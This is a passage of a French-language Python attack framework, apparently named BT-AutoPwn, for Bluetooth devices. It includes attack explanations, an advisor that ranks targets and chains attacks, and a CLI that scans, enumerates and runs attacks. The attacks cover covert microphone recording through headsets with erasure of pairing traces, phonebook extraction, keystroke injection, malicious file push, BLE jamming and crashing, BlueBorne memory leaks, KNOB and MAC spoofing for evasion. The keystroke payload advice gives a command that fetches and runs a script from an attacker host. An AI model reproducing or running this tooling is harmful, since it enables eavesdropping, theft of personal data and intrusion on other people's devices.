        "conseil_avant": "Nécessite 2 adaptateurs. Utiliser BLE Deauth d'abord pour forcer la déconnexion de la cible — elle se reconnectera via notre proxy.",
        "conseil_apres": "Analyser le trafic dans Wireshark (format btsnoop). Les patterns répétitifs = messages de contrôle. Chercher les commandes d'activation/désactivation.",
    },
    "notif_replay": {
        "titre":         "Replay de notifications GATT",
        "quoi":          "Écoute les notifications GATT émises par l'appareil, les enregistre, puis les rejoue pour tromper les systèmes qui les écoutent.",
        "comment":       "Beaucoup d'IoT envoient des notifications GATT (capteur, statut, événements) sans nonce ou timestamp. Rejouer ces messages identiques trompe les applications clientes qui ne valident pas la fraîcheur.",
        "chercher":      "Replay 'OK ✓' = l'appareil accepte des messages dupliqués — pas de protection anti-replay. Critique pour contrôle d'accès ou déclencheurs d'alarme.",
        "conseil_avant": "Rester connecté pendant les 10s d'écoute. Attendre plusieurs cycles pour capturer différents types de notifications.",
        "conseil_apres": "Tester avec des délais variés (immédiat, 30s, 5min) — certains systèmes ont une fenêtre de validité temporelle. Un replay après 5min toujours accepté = faille grave.",
    },
    "pbap_dump": {
        "titre":         "Extraction du répertoire téléphonique (PBAP)",
        "quoi":          "Accède au carnet d'adresses via le profil PBAP (Phone Book Access Profile) et l'exporte en format vCard — noms, numéros, emails.",
        "comment":       "PBAP est prévu pour les kits voiture/mains-libres. Sur certains appareils mal configurés, il est accessible sans confirmation utilisateur via le canal RFCOMM exposé par ce profil.",
        "chercher":      "Fichier .vcf non vide = répertoire extrait. Vérifier aussi 'telecom/cch.vcf' pour l'historique d'appels entrants/sortants.",
        "conseil_avant": "Vérifier que PBAP est listé dans l'énumération SDP (UUID 0x112F). Sans ce service actif, l'attaque échouera immédiatement.",
        "conseil_apres": "Parser avec 'grep -A5 FN: fichier.vcf'. Les entrées incluent noms complets, numéros, emails, adresses — données OSINT très précieuses.",
    },
    "obex_push": {
        "titre":         "Push de fichier OBEX (Object Push Profile)",
        "quoi":          "Envoie un fichier à l'appareil via OPP sans authentification pour tester si les fichiers entrants sont acceptés automatiquement.",
        "comment":       "OPP (PSM 0x1105) est conçu pour partager des fichiers. Sur certains appareils anciens ou mal configurés, les pushes sont acceptés sans confirmation — permettant la livraison de fichiers malveillants.",
        "chercher":      "Code retour 0 + absence de rejet = fichier accepté. L'appareil affiche souvent une notification. Tester d'abord avec un fichier vide.",
        "conseil_avant": "Vérifier OPP dans SDP (UUID 0x1105). iOS rejette systématiquement. Plus efficace sur Android < 6.0 et appareils Nokia/Blackberry anciens.",
        "conseil_apres": "Si accepté : escalader vers un APK malveillant ('mise_a_jour.apk') ou un document avec macro. Sur vieux Android, certains APKs s'installent automatiquement.",
    },
    "bluejack": {
        "titre":         "Bluejacking (OBEX Push non sollicité)",
        "quoi":          "Envoie un message non sollicité à l'appareil via OBEX Push pour tester sa réactivité aux connexions non autorisées.",
        "comment":       "Technique historique (2003) mais toujours révélatrice. Exploite OPP pour livrer du contenu. L'appareil affiche le nom du fichier ou son contenu — test de réceptivité aux attaques sociales.",
        "chercher":      "L'appareil affiche-t-il la notification sans demander confirmation ? Si oui, vulnérable au bluejacking — et très probablement aussi à obex_push.",
        "conseil_avant": "Plus efficace sur anciens appareils. Les smartphones modernes rejettent par défaut sauf si déjà couplés.",
        "conseil_apres": "Si accepté sans confirmation → escalader immédiatement vers obex_push avec payload réel. Tester aussi PBAP si c'est un téléphone.",
    },
    "hid_inject": {
        "titre":         "Injection de frappes clavier HID",
        "quoi":          "Se connecte en tant que périphérique HID Bluetooth et injecte des frappes clavier dans le système cible sans interaction utilisateur.",
        "comment":       "HID Bluetooth utilise L2CAP PSM 0x11 (contrôle) et 0x13 (données). L'OS accepte l'appareil comme clavier légitime automatiquement sur les systèmes non verrouillés.",
        "chercher":      "Connexion HID réussie = accès clavier. Tester avec une touche inoffensive (Caps Lock) avant tout payload d'attaque pour confirmer la réception.",
        "conseil_avant": "La cible doit être déverrouillée. RSSI > -65 dBm recommandé — les pertes de signal causent des frappes manquées dans les payloads.",
        "conseil_apres": "Payload recommandé : ouvrir terminal (Win+R ou Ctrl+Alt+T) → wget http://[attaquant]/payload.sh → bash payload.sh. Délais entre frappes : 50ms min.",
    },
    "audio_intercept": {
        "titre":         "Interception Audio Bluetooth (Blue Phantom)",
        "quoi":          "Établit une connexion avec un appareil audio (casque, kit mains-libres) pour activer son microphone et enregistrer l'audio ambiant à distance.",
        "comment":       "Le profil HFP active le microphone bidirectionnel. Après couplage automatique via bluetoothctl, PulseAudio expose la source audio de l'appareil BT — capturable via parecord en MP3 ou WAV.",
        "chercher":      "Source 'bluez_source.XX.hfp' dans PulseAudio = microphone actif. L'enregistrement tourne en tâche de fond jusqu'à l'arrêt manuel.",
        "conseil_avant": "RSSI idéal : > -60 dBm. Signal faible = coupures dans l'enregistrement. Certains appareils demandent une confirmation physique pour le couplage.",
        "conseil_apres": "Fichier dans ~/Projects/bt-autopwn/zerosync_logs/recordings/. Stopper avec 'Stop Audio + Cleanup BT' pour effacer les traces de couplage sur la cible.",
    },
    "ble_deauth": {
        "titre":         "Déauthentification BLE (Déconnexion forcée)",
        "quoi":          "Interrompt de force la connexion BLE active entre l'appareil et son contrôleur via un flood L2CAP et des commandes HCI de déconnexion.",
        "comment":       "BLE n'authentifie pas les trames de déconnexion. L2ping surdimensionné sature le buffer de réception. Les commandes HCI ledc envoient un signal de terminaison directement au contrôleur BT.",
        "chercher":      "L'appareil recommence à diffuser des annonces BLE (advertising) = déconnecté. L'application cliente affiche 'déconnecté'.",
        "conseil_avant": "Technique classiquement utilisée comme précurseur du MITM : déconnecter l'appareil de son contrôleur légitime pour le forcer à se reconnecter via notre proxy.",
        "conseil_apres": "Enchaîner immédiatement avec BLE MITM après la déconnexion — l'appareil tente de se reconnecter dans les 5-30s suivant.",
    },
    "ble_crasher": {
        "titre":         "Crash d'appareil BLE",
        "quoi":          "Envoie des paquets malformés et surdimensionnés pour provoquer un crash ou redémarrage du firmware de l'appareil cible.",
        "comment":       "Trois vecteurs combinés : (1) L2ping 65000 bytes dépasse les buffers, (2) Writes GATT malformés sur handles invalides saturent le gestionnaire d'erreurs, (3) Flood connexions épuise les ressources.",
        "chercher":      "L'appareil cesse de répondre ou disparaît de la liste BLE. Il peut réapparaître après quelques secondes (redémarrage watchdog).",
        "conseil_avant": "À utiliser sur tes propres appareils uniquement. La récupération peut nécessiter un redémarrage manuel ou reset usine.",
        "conseil_apres": "Si l'appareil redémarre et perd son couplage → fenêtre pour un couplage non autorisé. Certains firmwares repartent en mode 'factory' sans protection.",
    },
    "zerojam": {
        "titre":         "ZeroJam — Flood d'annonces BLE",
        "quoi":          "Inonde les canaux d'annonces BLE (37, 38, 39) avec un volume massif de paquets pour saturer la bande passante et masquer les appareils légitimes.",
        "comment":       "Le BLE utilise 3 canaux dédiés aux annonces (2402, 2426, 2480 MHz). En envoyant des commandes HCI LE Set Advertising en boucle rapide, on sature ces canaux — les scanners BLE environnants ne peuvent plus détecter les appareils légitimes.",
        "chercher":      "Les autres appareils BLE deviennent indétectables pendant le flood. Les apps mobiles affichent des timeouts ou des appareils qui 'clignotent'.",
        "conseil_avant": "Perturbe TOUS les appareils BLE à portée, pas seulement la cible. Durée recommandée pour test : 15-30s. Avertir l'environnement si tests en entreprise.",
        "conseil_apres": "Après le flood, scanner immédiatement — les appareils qui mettent plus de 3s à réapparaître ont des firmwares plus fragiles (buffer recovery lent).",
    },
    "blueborne": {
        "titre":         "Détection BlueBorne (CVE-2017-1000251 / 1000250)",
        "quoi":          "Vérifie si l'appareil est potentiellement vulnérable aux exploits BlueBorne permettant l'exécution de code à distance sans interaction utilisateur.",
        "comment":       "BlueBorne (Armis, 2017) est un ensemble de 8 vulnérabilités. CVE-2017-1000251 cible le stack BT Linux (buffer overflow L2CAP), CVE-2017-1000250 cible SDP. L'évaluation se base sur la version LMP déclarée.",
        "chercher":      "LMP 0x06-0x07 (BT 4.0-4.2) non patché = très probablement vulnérable. Les appareils patchés après septembre 2017 sont corrigés.",
        "conseil_avant": "Check passive et non destructive — toujours la lancer en premier sur un appareil Classic inconnu.",
        "conseil_apres": "Si vulnérable → enchaîner avec CVE-2017-0785 (info leak mémoire) pour bypass ASLR, puis envisager l'exploit RCE complet avec le PoC BlueBorne.",
    },
    "cve_2017_0785": {
        "titre":         "CVE-2017-0785 — Fuite mémoire SDP (BlueBorne)",
        "quoi":          "Exploite une faille dans le gestionnaire SDP pour provoquer une fuite d'informations mémoire (heap info leak) — utile pour bypass ASLR avant un exploit RCE.",
        "comment":       "Un 'Continuation State' surdimensionné dans une requête SDP Service Search force le handler à lire au-delà du buffer alloué. La réponse contient des fragments du heap, incluant potentiellement des adresses mémoire réelles.",
        "chercher":      "Réponse SDP > 8 bytes avec données non-standard = fuite probable. Les patterns 0x7f... ou 0xffff... dans les octets 8-16 = adresses 64-bit leakées.",
        "conseil_avant": "Vérifier d'abord avec BlueBorne Check que la version LMP est potentiellement vulnérable. Sur appareils patchés, la réponse SDP sera tronquée.",
        "conseil_apres": "Enregistrer les bytes leakés — ils permettent de calculer les offsets ASLR réels pour un exploit RCE ciblé. Utiliser en combo avec BlueBorne RCE PoC.",
    },
    "mac_spoof": {
        "titre":         "Usurpation d'adresse MAC Bluetooth",
        "quoi":          "Modifie l'adresse MAC BT de l'adaptateur pour masquer l'identité de l'attaquant ou impersonner un appareil de confiance déjà connu de la cible.",
        "comment":       "L'adresse MAC BT est utilisée pour l'authentification et les listes blanches de couplage. Via btmgmt, on peut la changer à chaud et contourner des filtres MAC ou se faire passer pour un appareil légitime déjà couplé.",
        "chercher":      "Confirmer avec 'hciconfig hci0' que la nouvelle MAC est active. Certains chipsets Qualcomm ne supportent pas le changement — fallback macchanger.",
        "conseil_avant": "Noter l'adresse MAC originale avant — indispensable pour la restaurer. Après les tests, toujours remettre l'adresse originale.",
        "conseil_apres": "Pour impersonner un appareil couplé : obtenir sa MAC (scan ou logs BT de la cible), la copier exactement, puis tenter la connexion — la cible peut accepter sans redemander confirmation.",
    },
    "alias_loop": {
        "titre":         "Boucle d'alias Broadcast",
        "quoi":          "Fait tourner rapidement l'identité visible de l'adaptateur (iPhone, Galaxy, AirPods…) pour brouiller les systèmes de surveillance BT.",
        "comment":       "Toutes les 2s, le nom BT diffusé change. Les scanners et IDS BT environnants voient une liste changeante d'appareils différents — difficile de corréler avec un attaquant unique.",
        "chercher":      "Les scanners à portée doivent afficher les faux noms dans leur liste. Si certains noms ne s'affichent pas, le délai de rotation est trop court.",
        "conseil_avant": "Désactiver avant des attaques ciblées — le changement de nom perturbe les reconnexions et les protocoles de couplage.",
        "conseil_apres": "Combiner avec MAC Spoof pour une anonymisation maximale : MAC aléatoire + nom changeant = très difficile à tracer dans les logs système.",
    },
}

# ── Advisor — conseils contextuels ────────────────────────────────────────────

class Advisor:
    """Génère des conseils contextuels en français basés sur l'état de l'appareil et les résultats."""

    @staticmethod
    def assess_device(dev: BTDevice) -> list[str]:
        tips = []

        # Signal RSSI
        if dev.rssi is not None:
            if dev.rssi >= -50:
                tips.append("📶 Signal excellent — toutes les attaques sont viables, connexions stables garanties.")
            elif dev.rssi >= -65:
                tips.append("📶 Signal bon — connexions fiables. MITM et Audio Intercept sont viables à cette distance.")
            elif dev.rssi >= -80:
                tips.append("⚠️ Signal moyen — MITM et RFCOMM peuvent être instables. Se rapprocher à moins de 5m si possible.")
            else:
                tips.append("❌ Signal faible (< -80 dBm) — haute probabilité d'échec sur attaques actives. Rapproche-toi ou utilise une antenne directionnelle.")

        # Firmware / LMP
        if dev.lmp_version:
            old = ["0x06","0x07","0x08","4.0","4.1","4.2","3.0"]
            if any(v in dev.lmp_version for v in old):
                tips.append(f"🚨 LMP {dev.lmp_version} — firmware probablement non patché contre BlueBorne (sept. 2017). Lancer BlueBorne Check et CVE-2017-0785 en priorité absolue.")

        # Type d'appareil
        if dev.dev_type == "Classic":
            tips.append("💡 BT Classic — commencer par SDP Enumeration pour cartographier la surface d'attaque avant toute action.")
        elif dev.dev_type == "BLE":
            tips.append("💡 BLE pur — lancer Bettercap BLE Bridge + GATT Write pour identifier les services accessibles sans authentification.")
        elif dev.dev_type in ("Dual","DUAL"):
            tips.append("💡 Dual Mode (Classic + BLE) — deux surfaces d'attaque. Commencer par SDP Classic, puis explorer GATT BLE en parallèle.")

        # Fabricant
        mfr = (dev.manufacturer or "").lower()
        if "apple" in mfr:
            tips.append("🍎 Appareil Apple — iOS résiste à la plupart des attaques Classic. Focus BLE GATT si AirPods/Watch. OBEX Push rejeté systématiquement.")
        elif "raspberry" in mfr:
            tips.append("🥧 Raspberry Pi — appareil de lab. Vérifier si des services non sécurisés sont actifs (RFCOMM ouvert, SDP exposé).")
        elif "samsung" in mfr:
            tips.append("📱 Samsung — vérifier Android BT version. BlueFrag (CVE-2020-0022) affecte Android 8.0-9.0 non patché.")
        elif "cambridge" in mfr or "broadcom" in mfr:
            tips.append("🔧 Chipset Cambridge/Broadcom — généralement DUAL mode. Vérifier le support LE pour les attaques BLE avancées.")

        # Services détectés
        protos = classify_services(dev.services + [str(c) for c in dev.characteristics])
        if "HFP" in protos or "HSP" in protos:
            tips.append("🎙️ Profil micro détecté (HFP/HSP) — Audio Intercept est la priorité n°1. L'accès au microphone est probablement possible.")
        if "A2DP" in protos:
            tips.append("🎵 Audio A2DP détecté — casque/enceinte. Peut également exposer le micro via HFP. Tenter Audio Intercept.")
        if "HID" in protos:
            tips.append("⌨️ Profil HID (clavier/souris) — HID Injection est la priorité absolue sur cet appareil. Contrôle direct de la saisie.")
        if "PBAP" in protos:
            tips.append("📒 PBAP détecté — répertoire téléphonique probablement extractible. Lancer PBAP Dump immédiatement.")
        if "RFCOMM" in protos:
            tips.append("📡 RFCOMM exposé — scanner les 30 canaux, tenter connexion et commandes AT pour identifier le protocole.")
        if "BNEP" in protos or "PAN" in protos:
            tips.append("🌐 Réseau BT (BNEP/PAN) — CVE-2017-1000250 (BlueBorne RCE) cible ce profil. Vérifier la version firmware en urgence.")
        if "GATT" in protos and dev.dev_type in ("BLE","Dual","DUAL"):
            tips.append("🔗 Services GATT présents — énumérer toutes les characteristics d'abord, puis tester GATT Write sur chacune.")

        # Vulnérabilités
        if len(dev.vulnerabilities) == 0:
            tips.append("ℹ️ Aucune vuln identifiée — l'énumération des services n'a pas encore été faite. Lancer 'Énumérer appareil' en premier.")
        elif len(dev.vulnerabilities) >= 5:
            tips.append(f"🔥 Surface critique ({len(dev.vulnerabilities)} vulns) — prioriser par sévérité : CRITICAL → HIGH → MEDIUM. Ne pas attaquer dans le désordre.")

        if not tips:
            tips.append("💡 Lancer l'énumération des services pour obtenir des conseils ciblés sur cet appareil.")
        return tips

    @staticmethod
    def after_attack(aid: str, result: str) -> list[str]:
        """Analyse le résultat d'une attaque et génère des recommandations pour la suite."""
        tips = []
        r = result.lower()

        if aid == "sdp_enum":
            if "hfp" in r or "hands-free" in r or "headset" in r:
                tips.append("✅ HFP/HSP dans SDP → Audio Intercept immédiatement.")
            if "pbap" in r or "phonebook" in r:
                tips.append("✅ PBAP dans SDP → PBAP Dump pour extraire le répertoire téléphonique.")
            if "rfcomm" in r or "serial" in r:
                tips.append("✅ RFCOMM détecté → RFCOMM Scan pour trouver les canaux ouverts.")
            if "hid" in r or "human interface" in r:
                tips.append("✅ HID dans SDP → HID Injection — contrôle direct du clavier/souris.")
            if not tips:
                tips.append("ℹ️ Peu de services visibles. L'appareil est peut-être en mode restreint. Tenter le couplage d'abord pour débloquer les services.")

        elif aid == "rfcomm_scan":
            if "ouvert" in r:
                tips.append("✅ Canaux ouverts trouvés → RFCOMM Connect puis tenter 'AT\\r\\n' pour identifier le protocole.")
            else:
                tips.append("ℹ️ Aucun canal ouvert. Un couplage préalable est peut-être requis pour exposer RFCOMM.")

        elif aid == "gatt_write":
            if "ecrit ✓" in r or "successfully" in r:
                tips.append("✅ Écriture GATT réussie sans auth ! Identifier les UUID de ces handles. Tester Notification Replay ensuite.")
                tips.append("💡 Tester des valeurs métier sur les handles accessibles : 01 (activer), 00 (désactiver), FF (max).")
            else:
                tips.append("ℹ️ Toutes les écritures refusées. L'appareil impose l'authentification — tenter BLE MITM pour intercepter le handshake.")

        elif aid == "blueborne":
            if "oui" in r or "vulnérable" in r:
                tips.append("🚨 Vulnérable BlueBorne → enchaîner CVE-2017-0785 (info leak) puis envisager l'exploit RCE complet.")
            else:
                tips.append("ℹ️ Non confirmé. Si le LMP est indéterminé, l'appareil peut quand même être vulnérable — vérifier manuellement la date de dernier patch.")

        elif aid == "cve_2017_0785":
            if "leakées" in r or "info leak" in r or "bytes" in r:
                tips.append("🚨 Fuite mémoire confirmée ! Les données hex contiennent potentiellement des adresses pour bypass ASLR. Combiner avec BlueBorne RCE PoC.")
            else:
                tips.append("ℹ️ Pas de fuite claire. L'appareil est peut-être patché ou le handler SDP a rejeté la requête malformée.")

        elif aid == "audio_intercept":
            if "enregistrement démarré" in r:
                tips.append("✅ Enregistrement actif ! Rester à portée (-60 dBm min). Stopper avec 'Stop Audio + Cleanup BT' pour effacer les traces.")
            elif "injoignable" in r:
                tips.append("❌ Injoignable. Vérifier RSSI et se rapprocher. L'appareil est peut-être en mode connexion exclusive (déjà couplé avec un autre).")
            elif "aucune source" in r:
                tips.append("⚠️ Connexion BT établie mais aucune source audio. Activer le profil HFP manuellement dans pavucontrol → onglet Configuration.")

        elif aid == "ble_deauth":
            if "envoyé" in r or "flood" in r:
                tips.append("✅ Déauth envoyé. Si l'appareil se reconnecte dans les 30s → enchaîner BLE MITM maintenant pour l'intercepter.")
                tips.append("💡 Observer l'application cliente de la cible — si elle affiche 'reconnexion', c'est le moment d'activer le proxy MITM.")

        elif aid == "ble_crasher":
            tips.append("💡 Observer l'appareil pendant 30s — les crashes watchdog peuvent prendre du temps à se manifester.")
            tips.append("🔍 Si l'appareil redémarre et perd son couplage → fenêtre pour un couplage non autorisé immédiatement après.")

        elif aid == "zerojam":
            tips.append("💡 Scanner immédiatement après le flood pour mesurer le temps de réapparition des appareils — indicateur de robustesse firmware.")

        elif aid == "notif_replay":
            if "ok ✓" in r:
                tips.append("✅ Replay accepté ! Pas de protection anti-replay. Tester avec délais 30s, 5min, 1h pour confirmer l'absence de nonce temporel.")
            elif "capturé" in r:
                tips.append("💡 Notifications capturées. Même si le replay est refusé, le contenu des notifications révèle les données émises par l'appareil.")

        elif aid == "pbap_dump":
            if ".vcf" in r or "fn:" in r:
                tips.append("✅ Contacts extraits ! Chercher aussi 'telecom/cch.vcf' pour l'historique d'appels et 'telecom/ich.vcf' pour les appels reçus.")

        elif aid == "rfcomm_connect":
            if "connection" in r.lower() or "connected" in r.lower():
                tips.append("✅ Connexion RFCOMM établie → envoyer 'AT\\r\\n', 'ATI\\r\\n', 'AT+CLAC\\r\\n' pour identifier les commandes supportées.")

        if not tips:
            tips.append("💡 Analyser le résultat brut ci-dessus pour identifier des informations exploitables.")
        return tips

    @staticmethod
    def attack_order(dev: BTDevice) -> str:
        """Retourne l'ordre d'attaque recommandé pour cet appareil."""
        protos = classify_services(dev.services + [str(c) for c in dev.characteristics])
        steps = []

        # Recon first
        if dev.dev_type in ("Classic","Dual","DUAL"):
            steps.append("① SDP Enumeration → cartographier les services exposés")
            steps.append("② BlueBorne Check → évaluer vulnérabilité firmware")
        if dev.dev_type in ("BLE","Dual","DUAL"):
            steps.append("① Bettercap BLE Bridge → recon avancé des advertisements")
            steps.append("② GATT Write → tester accès non authentifié")

        # High-value targets
        if "HFP" in protos or "HSP" in protos:
            steps.append("★ PRIORITÉ : Audio Intercept (microphone accessible)")
        if "HID" in protos:
            steps.append("★ PRIORITÉ : HID Injection (contrôle clavier direct)")
        if "PBAP" in protos:
            steps.append("★ PRIORITÉ : PBAP Dump (répertoire téléphonique)")

        # Escalation
        if dev.dev_type in ("Classic","Dual","DUAL"):
            steps.append("③ RFCOMM Scan + Connect → accès série/AT")
            steps.append("④ CVE-2017-0785 → info leak si LMP vulnérable")
        if dev.dev_type in ("BLE","Dual","DUAL"):
            steps.append("③ Notification Replay → tester protection anti-replay")
            steps.append("④ BLE Deauth → précurseur MITM")
            steps.append("⑤ BLE MITM → interception complète du trafic")

        if not steps:
            return "Énumérer les services d'abord pour des recommandations ciblées."
        return "\n".join(steps)

ADVISOR = Advisor()

# ── TIP_ACTIONS : mapping texte de conseil → attack ID ────────────────────────
TIP_ACTIONS: dict[str, str] = {
    "Audio Intercept":       "audio_intercept",
    "HID Injection":         "hid_inject",
    "PBAP Dump":             "pbap_dump",
    "RFCOMM Scan":           "rfcomm_scan",
    "RFCOMM Connect":        "rfcomm_connect",
    "GATT Write":            "gatt_write",
    "Notification Replay":   "notif_replay",
    "BLE MITM":              "ble_mitm",
    "BLE Deauth":            "ble_deauth",
    "BLE Device Crasher":    "ble_crasher",
    "BlueBorne Check":       "blueborne",
    "CVE-2017-0785":         "cve_2017_0785",
    "KNOB Attack":           "knob",
    "SDP Enumeration":       "sdp_enum",
    "Bettercap BLE":         "bettercap_ble",
    "Bluejacking":           "bluejack",
}

def tips_to_actions(tips: list[str]) -> list[tuple[str,str]]:
    """Extrait (label, attack_id) depuis une liste de conseils textuels."""
    actions = []
    seen = set()
    for tip in tips:
        for label, aid in TIP_ACTIONS.items():
            if label in tip and aid not in seen:
                actions.append((label, aid))
                seen.add(aid)
    return actions

# ─── Explication KNOB ─────────────────────────────────────────────────────────
EXPLANATIONS["knob"] = {
    "titre":         "KNOB Attack (CVE-2019-9506) — Réduction clé de chiffrement BT",
    "quoi":          "Force la négociation de la clé de chiffrement BT Classic à 1 byte d'entropie, réduisant les combinaisons possibles de 2^128 à seulement 256.",
    "comment":       "Lors du pairing BT, les deux appareils négocient la taille de la clé via LMP_max_encryption_key_size_req. Un attaquant MITM intercepte et modifie ce message pour imposer key_size=1 octet. Les deux victimes acceptent sans vérification ni alerte utilisateur.",
    "chercher":      "LMP version < 5.1 (0x0b) = probablement vulnérable. La réponse HCI Read Enc Key Size révèle l'entropie réelle négociée lors d'une connexion active.",
    "conseil_avant": "Nécessite être MITM actif entre la cible et son périphérique couplé. Lancer BlueBorne Check d'abord pour confirmer la version LMP.",
    "conseil_apres": "Si vulnérable : capturer trafic avec btmon, extraire session key, brute-force avec hashcat -m 23100. PoC : github.com/francozappa/knob",
}

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 10 — CLI MODE
# ═══════════════════════════════════════════════════════════════════════════════

def _cli_log(e: LogEntry):
    c = {"INFO":"white","WARN":"yellow","SUCCESS":"green","ERROR":"red","ATTACK":"orange3"}.get(e.level,"white")
    console.print(f"[dim]{e.ts}[/dim] [{c}]{e.msg}[/{c}]")

def run_cli():
    SESSION.subscribe(_cli_log)
    console.print(Panel(
        Text(f"BT-AutoPwn v{VERSION}", style="bold cyan", justify="center"),
        subtitle="[dim]Bluetooth Security Framework · CLI · Semi-Auto[/dim]",
        border_style="cyan"
    ))

    # Adapter status
    console.print(Rule("[bold]Adaptateurs[/bold]"))
    t = Table(box=box.SIMPLE)
    t.add_column("Interface", style="cyan")
    t.add_column("MAC", style="green")
    t.add_column("Type", style="yellow")
    t.add_column("Version")
    t.add_column("Chip", style="dim")
    t.add_column("Status", style="magenta")
    for iface, info in ADAPTERS.adapters.items():
        t.add_row(iface, info.mac, info.dev_type, f"BT{info.bt_version}",
                  info.chip or "?", "UP" if info.up else "DOWN")
    console.print(t)

    # Optional: standalone actions
    console.print(Rule("[bold]Actions standalone[/bold]"))
    console.print("[cyan]1[/cyan] MAC Spoof  [cyan]2[/cyan] Alias Loop  [cyan]3[/cyan] ZeroJam global  [cyan]4[/cyan] Bettercap scan  [cyan]s[/cyan] Passer")
    ch = Prompt.ask("→", default="s")
    if ch == "1":
        fake = Prompt.ask("MAC (vide=aléatoire)", default="")
        console.print(Panel(atk_mac_spoof(fake=fake or None), title="MAC Spoof"))
    elif ch == "2":
        dur = int(Prompt.ask("Durée (s)", default="30"))
        threading.Thread(target=atk_alias_loop, kwargs={"duration":dur}, daemon=True).start()
        input("  [Entrée pour stopper]"); _alias_stop.set()
    elif ch == "3":
        iface = ADAPTERS.best("ble") or "hci0"
        dur   = int(Prompt.ask("Durée (s)", default="30"))
        console.print(Panel(_zerojam_run(iface, dur), title="ZeroJam"))
    elif ch == "4":
        console.print(Panel(atk_bettercap_ble(None), title="Bettercap BLE"))

    # Scan
    console.print(Rule("[bold]Phase 1 — Scan[/bold]"))
    dur  = int(Prompt.ask("Durée scan (s)", default="15"))
    mode = Prompt.ask("Mode", choices=["classic","ble","both"], default="both")

    devices: list[BTDevice] = []
    if mode == "classic": devices = scan_classic(dur)
    elif mode == "ble":   devices = scan_ble(dur)
    else:                 devices = scan_all(dur)

    if not devices:
        console.print("[yellow]Aucun appareil. Vérifier que les cibles sont discoverable.[/yellow]"); return

    # Device table
    dt = Table(title=f"{len(devices)} appareil(s)", box=box.ROUNDED, show_lines=True)
    dt.add_column("#", width=4, style="dim")
    dt.add_column("MAC", style="cyan")
    dt.add_column("Nom", style="green")
    dt.add_column("Type", style="yellow")
    dt.add_column("Fabricant", style="blue")
    dt.add_column("RSSI")
    dt.add_column("LMP", style="dim")
    for i, d in enumerate(devices):
        dt.add_row(str(i), d.mac, d.name, d.dev_type, d.manufacturer or "-",
                   _rssi_bar(d.rssi), d.lmp_version[:15] if d.lmp_version else "-")
    console.print(dt)

    # Enumeration
    console.print(Rule("[bold]Phase 2 — Énumération[/bold]"))
    if Confirm.ask("Énumérer automatiquement tous les services ?", default=True):
        for dev in devices:
            full_enum(dev)

    # Attacks
    console.print(Rule("[bold]Phase 3 — Attaques[/bold]"))
    all_results: dict = {}

    for dev in devices:
        console.print(Rule(f"[bold cyan]{dev.name} — {dev.mac}[/bold cyan]"))

        # Vuln summary
        if dev.vulnerabilities:
            console.print(f"[red]Vulns:[/red] " + "  ".join(f"[red]•[/red] {v}" for v in dev.vulnerabilities[:4]))

        # ── Conseils Advisor ──
        tips = ADVISOR.assess_device(dev)
        if tips:
            tip_text = "\n".join(tips)
            console.print(Panel(tip_text, title="[magenta]💡 CONSEILS — Analyse de l'appareil[/magenta]",
                                border_style="magenta", padding=(0,1)))

        # ── Ordre d'attaque recommandé ──
        order = ADVISOR.attack_order(dev)
        console.print(Panel(order, title="[cyan]📋 ORDRE D'ATTAQUE RECOMMANDÉ[/cyan]",
                            border_style="cyan", padding=(0,1)))

        # Attack table
        unique_atks = list(dict.fromkeys(a for a,_ in dev.attack_surface if a in ATTACKS))
        if not unique_atks:
            console.print("[dim]Aucune surface d'attaque identifiée.[/dim]"); continue

        at = Table(box=box.ROUNDED)
        at.add_column("#", width=4)
        at.add_column("Attaque", style="yellow")
        at.add_column("Cat.", style="cyan", width=10)
        at.add_column("Sévérité", width=10)
        at.add_column("Adaptateur auto", style="dim")
        for i, aid in enumerate(unique_atks):
            a    = ATTACKS[aid]
            sev  = a["sev"]
            sc   = SEV_COLOR.get(sev,"white")
            auto_iface = ADAPTERS.best(a["cap"]) or "?"
            at.add_row(str(i), a["name"], a["cat"], f"[{sc}]{sev}[/{sc}]", auto_iface)
        console.print(at)

        console.print("[bold]Choix:[/bold] numéro | [cyan]a[/cyan]=tous | [cyan]s[/cyan]=passer")
        ch = Prompt.ask("→", default="s")
        if ch == "s": continue
        to_run = list(dict.fromkeys(a for a,_ in dev.attack_surface if a in ATTACKS)) if ch=="a" \
                 else ([unique_atks[int(ch)]] if ch.isdigit() and int(ch) < len(unique_atks) else [])
        for aid in to_run:
            # ── Explication avant l'attaque ──
            if aid in EXPLANATIONS:
                ex = EXPLANATIONS[aid]
                ex_text  = f"[bold white]{ex['quoi']}[/bold white]\n\n"
                ex_text += f"[dim]⚙️  Comment :[/dim] {ex['comment']}\n"
                ex_text += f"[dim]🔍 Chercher :[/dim] {ex['chercher']}\n"
                ex_text += f"[dim]⚠️  Conseil avant :[/dim] [yellow]{ex['conseil_avant']}[/yellow]"
                console.print(Panel(ex_text, title=f"[bold cyan]📖 {ex['titre']}[/bold cyan]",
                                    border_style="cyan", padding=(0,1)))

            result = run_attack(aid, dev)
            console.print(Panel(result[:1500], title=f"[green]{ATTACKS[aid]['name']}[/green]", border_style="green"))
            all_results.setdefault(dev.mac, {})[aid] = result

            # ── Conseils après l'attaque ──
            post_tips = ADVISOR.after_attack(aid, result)
            if post_tips:
                post_text = "\n".join(post_tips)
                if aid in EXPLANATIONS:
                    post_text += f"\n\n[dim]💡 Conseil général :[/dim] {EXPLANATIONS[aid]['conseil_apres']}"
                console.print(Panel(post_text, title="[magenta]🎯 ANALYSE DU RÉSULTAT & SUITE[/magenta]",
                                    border_style="magenta", padding=(0,1)))

    # Export
    console.print(Rule("[bold]Phase 4 — Export[/bold]"))
    if Confirm.ask("Exporter la session ?", default=True):
        paths = export_session(devices, all_results)
        for fmt, p in paths.items():
            console.print(f"  [{fmt.upper()}] {p}")

    console.print("\n[bold green]Session terminée.[/bold green]")

# ═══════════════════════════════════════════════════════════════════════════════
# SECTION 11 — GUI MODE (tkinter — cyberpunk tabs)
# ═══════════════════════════════════════════════════════════════════════════════

def run_gui():
    try:
        import tkinter as tk
        from tkinter import ttk, scrolledtext, simpledialog, messagebox
    except ImportError:
        print("[!] tkinter manquant"); sys.exit(1)

    devices:        list[BTDevice] = []
    sel_dev:        list           = [None]
    atk_results:    dict           = {}
    gui_q:          Queue          = Queue()

    # ── Color palette ──
    BG   = "#0b0b0f"
    BG2  = "#111118"
    BG3  = "#1a1a24"
    FG   = "#d4d4d8"
    ACC  = "#39ff14"   # neon green
    ACC2 = "#00e5ff"   # cyan
    WARN = "#ffcc00"
    ERRR = "#ff4455"
    ATK  = "#ff8800"

    # ── Log callback ──
